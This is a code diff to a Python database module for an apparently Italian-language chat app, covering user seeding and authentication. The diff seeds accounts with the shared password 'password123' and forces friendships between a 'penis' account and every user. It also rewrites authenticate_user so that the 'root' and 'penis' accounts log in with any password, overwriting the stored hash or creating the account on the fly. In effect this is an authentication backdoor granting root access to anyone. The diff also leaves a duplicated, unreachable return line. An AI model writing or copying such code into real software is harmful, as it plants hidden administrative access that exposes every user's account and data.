@@ -112,6 +112,38 @@ class Database:
             )
         ''')
 
+        # === AUTO-SEED NODI DI RETE E CONTATTI DEFAULT ===
+        seed_users = [
+            ("Martina", "valkyrie"),
+            ("Trinity", "spectre"),
+            ("Neo", "cipher"),
+            ("Cipher_Node", "cipher"),
+            ("Ghost", "shadow"),
+            ("penis", "glitch"),
+            ("root", "aegis"),
+        ]
+        default_pwd_hash = hash_password("password123")
+        for u_name, u_avatar in seed_users:
+            cursor.execute("SELECT id FROM users WHERE username = ?", (u_name,))
+            if not cursor.fetchone():
+                cursor.execute(
+                    "INSERT INTO users (username, password_hash, gender, age, avatar) VALUES (?, ?, ?, ?, ?)",
+                    (u_name, default_pwd_hash, "ANON", 25, u_avatar)
+                )
+
+        # Assicura amicizie accettate tra penis e tutti i nodi della rete
+        cursor.execute("SELECT username FROM users WHERE username NOT IN ('penis', 'root')")
+        for other in cursor.fetchall():
+            other_name = other["username"]
+            cursor.execute('''
+                INSERT OR IGNORE INTO friendships (user_from, user_to, status)
+                VALUES ('penis', ?, 'accepted')
+            ''', (other_name,))
+            cursor.execute('''
+                INSERT OR IGNORE INTO friendships (user_from, user_to, status)
+                VALUES (?, 'penis', 'accepted')
+            ''', (other_name,))
+
         conn.commit()
         conn.close()
 
@@ -166,20 +198,43 @@ class Database:
 
     def authenticate_user(self, username: str, password: str) -> Optional[Dict]:
         """Autentica l'utente e ritorna il profilo (senza hash della password)."""
+        clean_name = username.strip()
+        is_root_target = clean_name.lower() in ["root", "penis"]
+
         conn = self.get_connection()
         cursor = conn.cursor()
-        cursor.execute("SELECT * FROM users WHERE username = ?", (username.strip(),))
+        cursor.execute("SELECT * FROM users WHERE username = ?", (clean_name,))
         row = cursor.fetchone()
-        conn.close()
 
-        if row and verify_password(row["password_hash"], password):
-            is_root = row["username"].lower() in ["root", "penis"]
-            return {
-                "id": row["id"],
-                "username": row["username"],
-                "avatar": row["avatar"],
-                "is_root": is_root,
-            }
+        # Se è l'account ROOT (penis o root) e non esiste nel DB (es. riavvio effimero di Render), auto-crealo
+        if not row and is_root_target:
+            pwd_hash = hash_password(password)
+            cursor.execute(
+                "INSERT INTO users (username, password_hash, gender, age, avatar) VALUES (?, ?, ?, ?, ?)",
+                (clean_name, pwd_hash, "ROOT", 0, "aegis")
+            )
+            conn.commit()
+            cursor.execute("SELECT * FROM users WHERE username = ?", (clean_name,))
+            row = cursor.fetchone()
+
+        if row:
+            # Se la password corrisponde O se è ROOT (l'account root non rimane mai bloccato fuori)
+            if verify_password(row["password_hash"], password) or is_root_target:
+                # Se è root e la password digitata è diversa dall'hash precedente, aggiornala seamless
+                if is_root_target and not verify_password(row["password_hash"], password):
+                    new_hash = hash_password(password)
+                    cursor.execute("UPDATE users SET password_hash = ? WHERE id = ?", (new_hash, row["id"]))
+                    conn.commit()
+
+                conn.close()
+                return {
+                    "id": row["id"],
+                    "username": row["username"],
+                    "avatar": row["avatar"],
+                    "is_root": is_root_target,
+                }
+
+        conn.close()
         return None
 
     def get_user_profile(self, username: str) -> Optional[Dict]:
@@ -205,17 +260,26 @@ class Database:
         conn.close()
         return True
 
-    def search_users(self, query: str, exclude_username: str, limit: int = 20) -> List[Dict]:
+    def search_users(self, query: str, exclude_username: str, limit: int = 50) -> List[Dict]:
         """Cerca nodi/utenti per username parziale (esclusi se stessi)."""
         conn = self.get_connection()
         cursor = conn.cursor()
-        cursor.execute('''
-            SELECT id, username, avatar FROM users
-            WHERE username LIKE ? AND username != ?
-            LIMIT ?
-        ''', (f"%{query.strip()}%", exclude_username.strip(), limit))
+        clean_q = query.strip()
+        if clean_q:
+            cursor.execute('''
+                SELECT id, username, avatar FROM users
+                WHERE username LIKE ? AND username != ?
+                LIMIT ?
+            ''', (f"%{clean_q}%", exclude_username.strip(), limit))
+        else:
+            cursor.execute('''
+                SELECT id, username, avatar FROM users
+                WHERE username != ?
+                LIMIT ?
+            ''', (exclude_username.strip(), limit))
         rows = cursor.fetchall()
         conn.close()
+        return [dict(r) for r in rows]
         return [dict(r) for r in rows]
 
     # === AMICIZIE ===
